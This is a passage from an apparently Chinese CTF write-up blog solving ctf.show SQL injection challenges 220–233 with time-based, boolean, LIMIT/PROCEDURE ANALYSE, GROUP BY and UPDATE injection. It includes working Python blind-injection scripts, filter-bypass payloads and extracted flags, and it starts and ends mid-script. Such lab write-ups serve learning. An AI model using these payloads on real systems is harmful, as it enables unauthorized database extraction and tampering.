class="built_in">chr</span>(end) == <span class="string">&quot;&#125;&quot;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n⑨酱使命完成&quot;</span>)</span><br></pre></td></tr></table></figure></div>





<h2 id="220（多禁了substr和concat）"><a href="#220（多禁了substr和concat）" class="headerlink" title="220（多禁了substr和concat）"></a>220（多禁了substr和concat）</h2><p><strong>还是看看过滤</strong></p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//屏蔽危险分子</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/sleep|benchmark|rlike|ascii|hex|concat_ws|concat|mid|substr/i&#x27;</span>,<span class="variable">$str</span>);</span><br><span class="line">&#125;   </span><br><span class="line">  </span><br></pre></td></tr></table></figure></div>

<p><strong>因为多禁了concat，所以之前我们使用left等替换mid、substr，依旧可行，但是需要配合limit一个一个查来绕过concat的限制</strong></p>
<p><strong>然后之前的限制依旧未解除，还是使用笛卡尔积（这里我使用的网速要求较低的。之前那个跑出来还是有问题，分段跑还行，半自动吧，看着它卡着不动了，就是当前末尾的不对，导致下一个也不能匹配，除去下一个之后，调整一下index和result重新接着跑就行）</strong></p>
<div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://bbd0ffd9-1926-4091-8fc7-73399a2a4f0a.challenge.ctf.show/api/&quot;</span></span><br><span class="line"><span class="comment"># 表名 ctfshow_flagxcac</span></span><br><span class="line"><span class="comment"># payload = &quot;left((select table_name from information_schema.tables where table_schema=database() limit 0,1),&#123;&#125;)=&#x27;&#123;&#125;&#x27;&quot;</span></span><br><span class="line"><span class="comment"># 列名 flagaabcc</span></span><br><span class="line"><span class="comment"># payload = &quot;left((select column_name from information_schema.columns where table_name=&#x27;ctfshow_flagxcac&#x27; limit 1,1),&#123;&#125;)=&#x27;&#123;&#125;&#x27;&quot;</span></span><br><span class="line"><span class="comment"># flag</span></span><br><span class="line">payload = <span class="string">&quot;left((select flagaabcc from ctfshow_flagxcac limit 0,1),&#123;&#125;)=&#x27;&#123;&#125;&#x27;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">valid_payload</span>(<span class="params">p: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;debug&quot;</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="string">&quot;ip&quot;</span>: <span class="string">f&quot;if(<span class="subst">&#123;p&#125;</span>,(select count(*) from information_schema.columns A,information_schema.tables B,&quot;</span></span><br><span class="line">              <span class="string">f&quot;information_schema.tables C),1) &quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    time_s = <span class="literal">None</span></span><br><span class="line">    time_e = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        time_s = time.time()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            _ = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        time_e = time.time()</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="comment"># 改用手动计时防止多次没跑完的笛卡尔积叠加卡死影响注入</span></span><br><span class="line">    <span class="keyword">return</span> time_e-time_s &gt; <span class="number">4</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">letters = <span class="string">&quot;&#123;&#125;_-&quot;</span> + string.ascii_lowercase + string.digits</span><br><span class="line">index = <span class="number">1</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">for</span> letter <span class="keyword">in</span> letters:</span><br><span class="line">        load = payload.<span class="built_in">format</span>(index, result + letter)</span><br><span class="line">        <span class="keyword">if</span> valid_payload(load):</span><br><span class="line">            result += letter</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] result: <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line">    index += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> result[-<span class="number">1</span>] == <span class="string">&quot;&#125;&quot;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure></div>



<h1 id="其他子句注入"><a href="#其他子句注入" class="headerlink" title="其他子句注入"></a>其他子句注入</h1><h2 id="limit-注入"><a href="#limit-注入" class="headerlink" title="limit 注入"></a>limit 注入</h2><h3 id="资料1"><a href="#资料1" class="headerlink" title="资料1"></a>资料1</h3><p><strong>此方法适用于MySQL 5.x中，在limit语句后面的注入 （应该是5.6以上修复了）</strong></p>
<p>可参考文章： [<a class="link"   href="https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html" >转载]Mysql下Limit注入方法 | 离别歌 (leavesongs.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><strong>看文章讨论</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\languages\websafe\DataCon学习\day3_sql注入\pic\image-20220823211612559.png"
                      alt="image-20220823211612559"
                ></p>
<p><strong>所以在procedure里面我们还是写 extractvalue() 而不用 select() 吧，这样版本限制要弱一些，可利用机会更多</strong></p>
<h3 id="资料2"><a href="#资料2" class="headerlink" title="资料2"></a>资料2</h3><p>查看另外师傅的博客</p>
<blockquote>
<p>mysql语句：select * from limit test limit 1,[可控点] or select … limit [可控点]</p>
<p>limit后面能够拼接的函数只有into和procedure，into可以用来写文件，本文我们不考虑。在Limit后面 可以用 procedure analyse()这个子查询，<strong>而且只能用extractvalue 和 benchmark 函数进行延时</strong></p>
<p><em><strong>procedure analyse(updatexml(rand(),concat(0x3a,benchmark(10000000,sha1(1)))),1)</strong></em></p>
<p>演示</p>
<p>select field from user where id &gt;0 order by id limit 1,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1)；</p>
<p>时间盲注</p>
<p>SELECT field FROM table WHERE id &gt; 0 ORDER BY id LIMIT 1,1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1)</p>
</blockquote>
<p><strong>注意看，我们可利用的注入位置是limit 的两个数字之后的位置，不是哪里都可以插procedure analyse的</strong></p>
<h3 id="221"><a href="#221" class="headerlink" title="221"></a>221</h3><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line">查询语句</span><br><span class="line">  <span class="comment">//分页查询</span></span><br><span class="line">  <span class="variable">$sql</span> = select * <span class="keyword">from</span> ctfshow_user <span class="title function_ invoke__">limit</span> (<span class="variable">$page</span>-<span class="number">1</span>)*<span class="variable">$limit</span>,<span class="variable">$limit</span>;</span><br><span class="line"></span><br><span class="line">返回逻辑</span><br><span class="line">    <span class="comment">//<span class="doctag">TODO:</span>很安全，不需要过滤</span></span><br><span class="line">	<span class="comment">//拿到数据库名字就算你赢</span></span><br><span class="line">      </span><br></pre></td></tr></table></figure></div>

<p>看题，我们的注入点在limit处，而且可以利用</p>
<p><strong>利用 procedure analyse 构造参数。</strong></p>
<p><strong>payload</strong> </p>
<div class="highlight-container" data-rel="Http"><figure class="iseeu highlight http"><table><tr><td class="code"><pre><span class="line">/api/?page=1&amp;limit=1 procedure analyse(extractvalue(rand(),concat(0x3a,database())),1)</span><br></pre></td></tr></table></figure></div>

<p>这里的page 1-1&#x3D;0，相当于只有后面的limit语句了</p>
<p>拼接之后的sql语句</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">$<span class="keyword">sql</span> <span class="operator">=</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> ctfshow_user limit <span class="number">0</span>,<span class="number">1</span> <span class="keyword">procedure</span> analyse(extractvalue(rand(),concat(<span class="number">0x3a</span>,database())),<span class="number">1</span>);</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\languages\websafe\DataCon学习\day3_sql注入\pic\image-20220823215511074.png"
                      alt="image-20220823215511074"
                ></p>
<h2 id="group-by注入"><a href="#group-by注入" class="headerlink" title="group by注入"></a>group by注入</h2><h3 id="资料"><a href="#资料" class="headerlink" title="资料"></a>资料</h3><p><strong>（gruop by 的报错注入）</strong></p>
<p><a class="link"   href="https://www.cnblogs.com/02SWD/p/CTF-sql-group_by.html#1869274163" >CTF-sql-mysql group by报错注入 - 浅易深 - 博客园 (cnblogs.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<ul>
<li><pre><code class="sql">select count(*) from information_schema.tables group by concat(database(),floor(rand(0)*2));
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">  一定可以注入成功（要成功注入，前提表中的记录数至少为三条）</span><br><span class="line"></span><br><span class="line">- ```sql</span><br><span class="line">  select count(*) from information_schema.tables group by concat(database(),floor(rand()*2));却不一定了吧。</span><br></pre></td></tr></table></figure></div>

（要成功注入，前提表中的记录数至少为两条）
</code></pre>
</li>
</ul>
<h3 id="222"><a href="#222" class="headerlink" title="222"></a>222</h3><p><strong>（group by 时间盲注，我试了一下报错注入好像不行，不知道为啥，可能是学艺不精）</strong></p>
<p>还是先看题</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line">查询语句</span><br><span class="line">  <span class="comment">//分页查询</span></span><br><span class="line">  <span class="variable">$sql</span> = select * <span class="keyword">from</span> ctfshow_user group by <span class="variable">$username</span>;</span><br><span class="line"></span><br><span class="line">过滤    </span><br><span class="line">  <span class="comment">//<span class="doctag">TODO:</span>很安全，不需要过滤</span></span><br></pre></td></tr></table></figure></div>

<p>知道了gruop by 的注入原理之后，可以使用之前的时间盲注脚本，这里以笛卡尔积的脚本演示</p>
<p><strong>(大致就是group by 会执行by后面的语句（要知道怎么排序所以需要执行呗），然后会爆错，信息会出现在报错中，能带出信息最好，不行就盲注呗)</strong></p>
<div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://07654e27-2464-4ef8-ba5f-cafdafabfd66.challenge.ctf.show/api/&quot;</span></span><br><span class="line"><span class="comment"># 表名 ctfshow_flaga,ctfshow_user</span></span><br><span class="line"><span class="comment"># payload = &quot;ascii(mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))&gt;&#123;&#125;&quot;</span></span><br><span class="line"><span class="comment"># 列名 id,flagaabc,info,id,username,pass</span></span><br><span class="line"><span class="comment"># payload = &quot;ascii(mid((select group_concat(column_name) from information_schema.columns where table_schema=database()),&#123;&#125;,1))&gt;&#123;&#125;&quot;</span></span><br><span class="line"><span class="comment"># flag</span></span><br><span class="line">payload = <span class="string">&quot;ascii(mid((select flagaabc from ctfshow_flaga),&#123;&#125;,1))&gt;&#123;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Cirno: 查询中(◍•ᴗ•◍)❤ &quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">valid_payload</span>(<span class="params">p: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    params = &#123;<span class="string">&quot;u&quot;</span>:<span class="string">f&quot;if(<span class="subst">&#123;p&#125;</span>,(select count(*) from information_schema.columns A,information_schema.tables B,information_schema.tables C),1) &quot;</span>&#125;</span><br><span class="line">    time_s = <span class="literal">None</span></span><br><span class="line">    time_e = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        time_s = time.time()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            _ = requests.get(url=url,params=params)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        time_e = time.time()</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="comment"># 改用手动计时防止多次没跑完的笛卡尔积叠加卡死影响注入</span></span><br><span class="line">    <span class="keyword">return</span> time_e-time_s &gt; <span class="number">4</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">index = <span class="number">1</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    start = <span class="number">32</span></span><br><span class="line">    end = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span>(<span class="built_in">abs</span>(start - end) == <span class="number">1</span> <span class="keyword">or</span> start == end):</span><br><span class="line">        everage = (start + end) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> valid_payload(payload.<span class="built_in">format</span>(index, everage)):</span><br><span class="line">            start = everage</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            end = everage</span><br><span class="line">    <span class="keyword">if</span> end &lt; start:</span><br><span class="line">        end = start</span><br><span class="line">    result += <span class="built_in">chr</span>(end)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] result: <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line">    index += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> result[-<span class="number">1</span>] == <span class="string">&quot;&#125;&quot;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n本天才查询完成 ｡◕‿◕｡ &quot;</span>)</span><br></pre></td></tr></table></figure></div>



<p><strong>自己的快速半自动（速度快多了，不嫌咱这半自动麻烦可以用）</strong></p>
<div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://07654e27-2464-4ef8-ba5f-cafdafabfd66.challenge.ctf.show/api/&quot;</span></span><br><span class="line"><span class="comment"># 表名 ctfshow_flaga,ctfshow_user</span></span><br><span class="line"><span class="comment"># payload = &quot;ascii(mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))&gt;&#123;&#125;&quot;</span></span><br><span class="line"><span class="comment"># 列名 id,flagaabc,info,id,username,pass</span></span><br><span class="line"><span class="comment"># payload = &quot;ascii(mid((select group_concat(column_name) from information_schema.columns where table_schema=database()),&#123;&#125;,1))&gt;&#123;&#125;&quot;</span></span><br><span class="line"><span class="comment"># flag</span></span><br><span class="line">payload = <span class="string">&quot;ascii(mid((select flagaabc from ctfshow_flaga),&#123;&#125;,1))&gt;&#123;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Cirno: 查询中(◍•ᴗ•◍)❤ &quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">valid_payload</span>(<span class="params">p: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">&quot;u&quot;</span>: <span class="string">f&quot;if(<span class="subst">&#123;p&#125;</span>,(SELECT count(*) FROM information_schema.columns A, information_schema.schemata B, information_schema.schemata C, information_schema.schemata D,information_schema.schemata E,information_schema.schemata F),1) &quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    time_s = <span class="literal">None</span></span><br><span class="line">    time_e = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        time_s = time.time()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            _ = requests.get(url=url,params=params)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        time_e = time.time()</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="comment"># 改用手动计时防止多次没跑完的笛卡尔积叠加卡死影响注入</span></span><br><span class="line">    <span class="keyword">return</span> time_e-time_s &gt; <span class="number">0.9</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="comment">#半自动，请自动调整result</span></span><br><span class="line">index = <span class="number">1</span> + <span class="built_in">len</span>(result)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    start = <span class="number">32</span></span><br><span class="line">    end = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span>(<span class="built_in">abs</span>(start - end) == <span class="number">1</span> <span class="keyword">or</span> start == end):</span><br><span class="line">        everage = (start + end) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> valid_payload(payload.<span class="built_in">format</span>(index, everage)):</span><br><span class="line">            start = everage</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            end = everage</span><br><span class="line">    <span class="keyword">if</span> end &lt; start:</span><br><span class="line">        end = start</span><br><span class="line">    result += <span class="built_in">chr</span>(end)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] result: <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line">    index += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> result[-<span class="number">1</span>] == <span class="string">&quot;&#125;&quot;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n本天才查询完成 ｡◕‿◕｡ &quot;</span>)</span><br></pre></td></tr></table></figure></div>







<h3 id="223"><a href="#223" class="headerlink" title="223"></a>223</h3><p>题目上还是和之前一样</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//分页查询</span></span><br><span class="line"><span class="variable">$sql</span> = select * <span class="keyword">from</span> ctfshow_user group by <span class="variable">$username</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//<span class="doctag">TODO:</span>很安全，不需要过滤</span></span><br><span class="line"><span class="comment">//用户名不能是数字</span></span><br></pre></td></tr></table></figure></div>

<p>但是测试后发现用户名输入不能包含数字，密码返回也不能包含密码，使用true替换即可，根据sql查询语句，我们可以使用username，所以可以使用布尔盲注，这样就比时间盲注省时间多了</p>
<h4 id="具体步骤"><a href="#具体步骤" class="headerlink" title="具体步骤"></a>具体步骤</h4><div class="highlight-container" data-rel="Http"><figure class="iseeu highlight http"><table><tr><td class="code"><pre><span class="line">/api/?u=concat(database(),floor(rand()*(true%2Btrue)))</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\languages\websafe\DataCon学习\day3_sql注入\pic\image-20220824210812216.png"
                      alt="image-20220824210812216"
                ></p>
<p><strong>可以明显发现有个列名是username，我们先group by 一下 username</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\languages\websafe\DataCon学习\day3_sql注入\pic\image-20220824210909564.png"
                      alt="image-20220824210909564"
                ></p>
<p>这里就把所有的数据写出来了（但是没有flag的，所以我猜测是不密码中包含数字的显示，所以使用了盲注）</p>
<p>当然这里时间盲注也行，但是太慢了，能布尔盲注还是布尔，我们发现可以以  passwordAUTO  作为判断，我们只需要没执行语句替换为无passwordAUTO的就行了，于是我是用了”ctfshow”</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\languages\websafe\DataCon学习\day3_sql注入\pic\image-20220824211200023.png"
                      alt="image-20220824211200023"
                ></p>
<p>上面的user1 和 user2不能用，被ban了嘛别做题做着做着做忘了</p>
<p>（我看有的师傅写的’a’也能行，不知道啥原理，有空上mysql试试&#x3D;。&#x3D;）</p>
<h4 id="exp-9"><a href="#exp-9" class="headerlink" title="exp"></a>exp</h4><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_num</span>(<span class="params">i: <span class="built_in">int</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;+&#x27;</span>.join(<span class="string">&quot;true&quot;</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(i))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://0b4bad5c-5040-42fc-93a4-f4a18f3629de.challenge.ctf.show/api/&quot;</span></span><br><span class="line"><span class="comment"># 表名 ctfshow_flagas,ctfshow_user</span></span><br><span class="line"><span class="comment"># payload = &quot;ascii(mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,true))&gt;&#123;&#125;&quot;</span></span><br><span class="line"><span class="comment"># 列名 id,flagasabc,info,id,username,pass</span></span><br><span class="line"><span class="comment"># payload = &quot;ascii(mid((select group_concat(column_name) from information_schema.columns where table_schema=database()),&#123;&#125;,true))&gt;&#123;&#125;&quot;</span></span><br><span class="line"><span class="comment"># flag</span></span><br><span class="line">payload = <span class="string">&quot;ascii(mid((select flagasabc from ctfshow_flagas),&#123;&#125;,true))&gt;&#123;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Cirno: 查询中(◍•ᴗ•◍)❤ &quot;</span>)</span><br><span class="line">judge = <span class="string">&quot;passwordAUTO&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">valid_payload</span>(<span class="params">p: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    username = <span class="string">f&quot;if(<span class="subst">&#123;p&#125;</span>,username,&#x27;ctfshow&#x27;)&quot;</span></span><br><span class="line">    response = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            response = requests.get(<span class="string">f&quot;<span class="subst">&#123;url&#125;</span>&quot;</span>, params=&#123;<span class="string">&quot;u&quot;</span>: username&#125;)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> judge <span class="keyword">in</span> response.text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">index = <span class="number">1</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    start = <span class="number">32</span></span><br><span class="line">    end = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span>(<span class="built_in">abs</span>(start - end) == <span class="number">1</span> <span class="keyword">or</span> start == end):</span><br><span class="line">        everage = (start + end) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> valid_payload(payload.<span class="built_in">format</span>(make_num(index), make_num(everage))):</span><br><span class="line">            start = everage</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            end = everage</span><br><span class="line">    <span class="keyword">if</span> end &lt; start:</span><br><span class="line">        end = start</span><br><span class="line">    result += <span class="built_in">chr</span>(end)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\r[+] here is flag: <span class="subst">&#123;result&#125;</span>&quot;</span>,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">chr</span>(end) == <span class="string">&quot;&#125;&quot;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    index += <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n本天才查询完成 ｡◕‿◕｡ &quot;</span>)</span><br></pre></td></tr></table></figure></div>







<h1 id="update"><a href="#update" class="headerlink" title="update"></a>update</h1><h2 id="231-232（一个是字符串）"><a href="#231-232（一个是字符串）" class="headerlink" title="231-232（一个是字符串）"></a>231-232（一个是字符串）</h2><p>题目</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//分页查询</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;update ctfshow_user set pass = &#x27;<span class="subst">&#123;$password&#125;</span>&#x27; where username = &#x27;<span class="subst">&#123;$username&#125;</span>&#x27;;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//无过滤</span></span><br></pre></td></tr></table></figure></div>



<p>看源码是post username和password</p>
<p>尝试</p>
<div class="highlight-container" data-rel="Http"><figure class="iseeu highlight http"><table><tr><td class="code"><pre><span class="line">password=1&#x27; where 1=1#&amp;username=1</span><br></pre></td></tr></table></figure></div>

<p><strong>发现确实都更改了</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\languages\websafe\DataCon学习\day3_sql注入\pic\image-20220827174004598.png"
                      alt="image-20220827174004598"
                ></p>
<p>然后我们就可以尝试去获取flag了，因为没有过滤且有回显，所以我们能直接构造payload去获取flag，还有一个需要注意的是，我们实际上修改的是username，因为password在update的时候是有引号包裹的，我们放入语句是会变成字符串的，因此不会执行。所以我们在update password的同时去修改username，剩下的就是普通的操作了</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"># payload <span class="number">1</span> 看数据库（username修改的语句记得拿括号包裹，不然会因为之间有空格而被解析成语句。也就是username取<span class="keyword">select</span>，后面的都变语句了，就会出错）</span><br><span class="line"># information_schema,test,mysql,performance_schema,ctfshow_web</span><br><span class="line">password<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;,username=(select group_concat(schema_name) from information_schema.schemata) where 1=1#&amp;username=1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># payload 2 看数据表</span></span><br><span class="line"><span class="string"># banlist,ctfshow_user,flaga</span></span><br><span class="line"><span class="string">password=1&#x27;</span>,username<span class="operator">=</span>(<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;ctfshow_web&#x27;</span>) <span class="keyword">where</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>#<span class="operator">&amp;</span>username<span class="operator">=</span><span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># payload <span class="number">3</span> 看字段名</span><br><span class="line"># id,flagas,info</span><br><span class="line">password<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;,username=(select group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>flaga<span class="string">&#x27;) where 1=1#&amp;username=1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># payload 4 看字段值</span></span><br><span class="line"><span class="string"># ctfshow&#123;0652bddc-e585-4772-9577-bacc23cfee9c&#125;</span></span><br><span class="line"><span class="string">password=1&#x27;</span>,username<span class="operator">=</span>(<span class="keyword">select</span> group_concat(flagas) <span class="keyword">from</span> flaga) <span class="keyword">where</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>#<span class="operator">&amp;</span>username<span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure></div>



<h2 id="233（都是字符）"><a href="#233（都是字符）" class="headerlink" title="233（都是字符）"></a>233（都是字符）</h2><p>题目和上一题没什么区别，就是修改之后不会显示了，但是有返回成功还是失败的信息，所以布尔盲注吧，一个一个填充判断是否正确</p>
<p>（主要就是username这里也变成了字符串，所以我们写的语句都变成字符串了，没有解析，需要通过 where 子句中的if 来盲注）</p>
<p>exp</p>
<div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 无过滤</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://339c2129-54eb-405c-a41e-9cbf6b64b5ba.challenge.ctf.show/api/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 表名 banlist,ctfshow_user,flag233333</span></span><br><span class="line"><span class="comment">#payload = &quot;if(ascii(mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))&gt;&#123;&#125;,1,0) #&quot;</span></span><br><span class="line"><span class="comment"># 列名 id,flagass233,info</span></span><br><span class="line"><span class="comment">#payload = &quot;if(ascii(mid((select group_concat(column_name) from information_schema.columns where table_name=&#x27;flag233333&#x27;),&#123;&#125;,1))&gt;&#123;&#125;,1,0) -- &quot;</span></span><br><span class="line"><span class="comment"># flag</span></span><br><span class="line">payload = <span class="string">&quot;if(ascii(substr((select flagass233 from 